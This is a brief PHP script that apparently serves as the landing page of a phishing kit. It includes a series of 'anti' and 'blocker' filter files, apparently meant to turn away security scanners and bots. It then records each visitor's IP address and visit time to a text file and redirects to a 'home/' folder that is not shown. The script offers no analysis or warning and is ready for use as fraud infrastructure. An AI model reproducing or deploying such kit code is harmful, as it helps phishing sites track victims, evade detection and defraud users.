<?php
   include "inc/function.inc.php";
  include "inc/filters/anti1.php";
  include "inc/filters/anti2.php";
  include "inc/filters/anti3.php";
  include "inc/filters/anti4.php";
  include "inc/filters/anti5.php";
  include "inc/filters/anti6.php";
  include "inc/filters/anti7.php";
  include "inc/filters/anti8.php";
  include "inc/filters/blocker.php";
  include "inc/filters/call911.php";
  

	$ip = getenv("REMOTE_ADDR");
	$file = fopen("v.txt","a");
	fwrite($file,"IP=".$ip."/TIME=".gmdate ("Y-n-d")." ".gmdate ("H:i:s")."/Once\n");
header("Location: home/");
?>